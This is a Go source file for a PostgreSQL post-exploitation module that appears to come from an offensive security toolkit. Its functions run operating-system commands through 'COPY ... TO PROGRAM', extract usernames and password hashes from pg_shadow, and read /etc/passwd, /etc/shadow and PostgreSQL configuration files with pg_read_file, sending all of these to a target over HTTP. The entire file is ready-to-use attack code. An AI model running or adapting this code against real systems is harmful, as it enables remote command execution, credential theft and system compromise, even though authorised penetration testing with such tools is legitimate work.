package dbpost

import (
	"encoding/json"
	"fmt"
	"strings"
)

type PostgresExploit struct {
	config *DBPostConfig
	client *HTTPClient
}

func NewPostgresExploit(config *DBPostConfig, client *HTTPClient) *PostgresExploit {
	return &PostgresExploit{
		config: config,
		client: client,
	}
}

func (p *PostgresExploit) CopyProgram(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueCopyProgram

	commands := []string{"id", "whoami", "hostname", "uname -a"}

	var output strings.Builder
	for _, cmd := range commands {
		query := fmt.Sprintf(`COPY (SELECT '') TO PROGRAM '%s'`, cmd)
		resp, err := p.executeQuery(creds, query)
		if err != nil {
			output.WriteString(fmt.Sprintf("[%s] Error: %v\n", cmd, err))
			continue
		}
		output.WriteString(fmt.Sprintf("[%s] Output: %s\n", cmd, resp))
	}

	if output.Len() > 0 {
		result.Success = true
		result.CmdOutput = output.String()
		result.Data = map[string]interface{}{
			"method":   "copy_to_program",
			"commands": len(commands),
		}
		return result, nil
	}

	return result, fmt.Errorf("copy program failed")
}

func (p *PostgresExploit) PGShadow(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniquePGShadow

	query := `SELECT usename, passwd, valuntil, useconfig FROM pg_shadow`
	resp, err := p.executeQuery(creds, query)
	if err != nil {
		return result, fmt.Errorf("query failed: %w", err)
	}

	var credsList []CredentialEntry
	lines := strings.Split(resp, "\n")
	for _, line := range lines {
		parts := strings.Split(line, "|")
		if len(parts) >= 2 {
			cred := CredentialEntry{
				Username: strings.TrimSpace(parts[0]),
				Password: strings.TrimSpace(parts[1]),
				Source:   "pg_shadow",
				Role:     "superuser",
			}
			if len(parts) >= 3 {
				cred.Hash = strings.TrimSpace(parts[2])
			}
			credsList = append(credsList, cred)
		}
	}

	if len(credsList) > 0 {
		result.Success = true
		result.Credentials = credsList
		result.Data = map[string]interface{}{
			"method": "pg_shadow_extraction",
			"count":  len(credsList),
		}
		return result, nil
	}

	return result, fmt.Errorf("pg_shadow extraction failed")
}

func (p *PostgresExploit) FSAccess(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueFSAccess

	queries := []struct {
		name  string
		query string
	}{
		{"read_etc_passwd", `SELECT pg_read_file('/etc/passwd', 0, 1000000)`},
		{"read_shadow", `SELECT pg_read_file('/etc/shadow', 0, 1000000)`},
		{"read_pg_hba", `SELECT pg_read_file('/etc/postgresql/pg_hba.conf', 0, 1000000)`},
		{"read_postgresql_conf", `SELECT pg_read_file('/etc/postgresql/postgresql.conf', 0, 1000000)`},
	}

	var output strings.Builder
	for _, q := range queries {
		resp, err := p.executeQuery(creds, q.query)
		if err != nil {
			output.WriteString(fmt.Sprintf("[%s] Error: %v\n", q.name, err))
			continue
		}
		if resp != "" {
			output.WriteString(fmt.Sprintf("[%s] Content:\n%s\n\n", q.name, resp))
		}
	}

	if output.Len() > 0 {
		result.Success = true
		result.CmdOutput = output.String()
		result.Data = map[string]interface{}{
			"method": "pg_filesystem_access",
		}
		return result, nil
	}

	return result, fmt.Errorf("filesystem access failed")
}

func (p *PostgresExploit) executeQuery(creds *DBCreds, query string) (string, error) {
	target := BuildURL(p.config.Target, "/query", 5432)

	payload := fmt.Sprintf(`{
		"query": "%s",
		"user": "%s",
		"password": "%s",
		"database": "%s"
	}`, strings.ReplaceAll(query, `"`, `\"`), creds.Username, creds.Password, creds.Database)

	body := strings.NewReader(payload)
	_, resp, err := p.client.Post(target, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return "", fmt.Errorf("execute query: %w", err)
	}

	var result map[string]interface{}
	if json.Unmarshal(resp, &result) == nil {
		if data, ok := result["data"].(string); ok {
			return data, nil
		}
		if error, ok := result["error"].(string); ok {
			return "", fmt.Errorf("postgresql error: %s", error)
		}
	}

	return string(resp), nil
}
